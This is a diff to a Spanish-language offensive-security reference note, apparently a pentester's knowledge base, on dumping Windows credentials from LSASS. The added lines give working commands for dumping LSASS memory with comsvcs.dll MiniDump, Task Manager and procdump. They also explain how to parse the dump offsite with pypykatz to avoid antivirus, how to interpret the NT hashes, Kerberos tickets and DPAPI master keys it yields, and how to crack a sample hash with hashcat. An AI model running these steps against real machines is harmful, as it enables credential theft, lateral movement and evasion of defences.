@@ -33,7 +33,10 @@ LSASS es el de mejor relación valor/esfuerzo, y por eso es el más vigilado. Qu
 ## 1. LSASS — volcar el proceso
 
 `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\out.dmp full`
-Binario firmado que ya está en el sistema. Ver [[LSASS - volcado vía comsvcs.dll MiniDump]] para cuándo elegirlo.
+Binario firmado que ya está en el sistema. El `<PID>` sale de `tasklist /svc` (buscar `lsass.exe`) o `Get-Process lsass` (campo `Id`). Ver [[LSASS - volcado vía comsvcs.dll MiniDump]] para cuándo elegirlo.
+
+Administrador de tareas → *Processes* → clic derecho en *Local Security Authority Process* → *Create dump file*.
+Sin CLI ni binario externo, pero pide **sesión gráfica interactiva** y deja `lsass.DMP` en `%temp%`. Método de último recurso cuando solo hay GUI; igual de ruidoso en disco que los demás.
 
 `procdump.exe -accepteula -ma lsass.exe out.dmp`
 Herramienta de Sysinternals, firmada por Microsoft. Se sube, así que deja archivo.
@@ -51,6 +54,33 @@ Después, fuera del objetivo:
 
 > [!danger] Volcar y parsear en la misma máquina es el error caro
 > Parsear el volcado dentro del objetivo obliga a subir mimikatz, que es lo que toda solución de seguridad conoce de memoria. Volcar con un binario firmado y **parsear afuera** convierte el problema de "evadir un antivirus" en "mover un archivo". El coste es el archivo: [[Sysmon EID 11 - FileCreate]] lo ve, y esa escritura es telemetría corroborante de [[Acceso a LSASS desde proceso no firmado]].
+
+### Leer la salida de pypykatz
+
+`pypykatz lsa minidump out.dmp` imprime un bloque por sesión de logon. Salida recortada de una sesión del usuario `bob`:
+
+```
+== MSV ==
+    Username: bob
+    NT: 64f12cddaa88057e06a81b54e73b949b
+== WDIGEST ==
+    password None
+== Kerberos ==
+    Username: bob
+== DPAPI ==
+    masterkey e8bc2faf77e7bd1891c0e49f0dea9d44...
+```
+
+Qué se concluye de cada bloque:
+
+| Bloque | Qué es | Qué se hace con eso |
+|---|---|---|
+| **MSV** | paquete que valida contra la SAM; trae el **hash NT** de la sesión activa | directo a [[Pass-the-hash]], o romper con `hashcat -m 1000` → en el ejemplo `64f12c…` da `Password1` |
+| **WDIGEST** | protocolo viejo que cacheaba la clave en texto plano | `password None` es lo esperado en Windows ≥ 8.1 (deshabilitado por defecto). Texto plano ahí = objetivo viejo o WDigest reactivado |
+| **Kerberos** | contraseñas, ekeys y tickets cacheados | habilita [[Pass-the-ticket]] contra otros hosts del dominio |
+| **DPAPI** | la `masterkey` del usuario con sesión activa | descifra sus secretos DPAPI (navegador, credenciales guardadas, RDP) — ver §4 |
+
+El salto clave es MSV → crackeo: `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt`. El criterio de modos y ataques está en [[Cracking offline - matriz de referencia]].
 
 ## 2. Registro local — sin tocar LSASS
 
